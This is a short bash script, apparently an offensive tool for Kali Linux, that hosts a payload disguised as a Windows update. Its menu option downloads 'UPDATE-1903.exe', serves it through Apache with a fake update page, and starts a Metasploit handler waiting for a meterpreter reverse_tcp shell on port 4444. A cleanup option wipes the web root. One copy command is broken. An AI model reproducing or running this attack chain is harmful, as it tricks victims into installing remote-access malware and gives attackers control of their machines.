#!/usr/bin/bash
# nu11secur1ty mode 2019
# DEVELOPMENT by @nu11secur1ty Veresion 4.0 ...
# version Shimazu 4.0 code name met@rpet@r
i="0"
resize -s 25 80
	clear
while [ $i -lt 1 ]
	do
		clear
#ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
ip=$(ip addr show eth0 | awk '/inet / {print $2}' | cut -d/ -f 1)

echo -e '\e[1;32m

 :::::::: :::    ::::::::::::::::::    ::::     :::    ::::::::::::    ::: 
:+:    :+::+:    :+:    :+:    +:+:+: :+:+:+  :+: :+:       :+: :+:    :+: 
+:+       +:+    +:+    +:+    +:+ +:+:+ +:+ +:+   +:+     +:+  +:+    +:+ 
+#++:++#+++#++:++#++    +#+    +#+  +:+  +#++#++:++#++:   +#+   +#+    +:+ 
       +#++#+    +#+    +#+    +#+       +#++#+     +#+  +#+    +#+    +#+ 
#+#    #+##+#    #+#    #+#    #+#       #+##+#     #+# #+#     #+#    #+# 
######## ###    #################       ######     ############ ######## 
					For (Kali Linux) code name met@rpet@r
 						\e[1;34m
					by nu11secur1ty
                           
     Use ONLY FOR EDUCATIONAL PURPOSES!!! STAY LEGAL!!!
                                                \e[1;23m
If you do not want to use the program, please press Ctrl+C to exit.

---------------------------------------------------------------------------
[1] Windows - update.exe [payload and listener] 
[5]         - Cleaning
'

service postgresql start

exe='1'
apk='2'
py='3'
jar='4' 
cl='5'

read x

# 1
if [ "$x" == "$exe" ]; then 
cd /opt/
wget https://github.com/nu11secur1ty/SSTC-HTTPS-login-credentials/raw/master/hosts/windows/UPDATE-1903.exe
cp  > UPDATEE101.exe /var/www/html
	cp -avr shimazu_module/Microupdate/* /var/www/html
	systemctl start apache2.service
echo -e 'Waiting for listener...'
msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"


# 5	
elif [ "$x" == "$cl" ]; then
	echo "Wait to clean..."
		sleep 3;
		systemctl stop apache2.service	
		rm -rf /var/www/html/*
		echo "Everything is clean ;)"
	fi
done
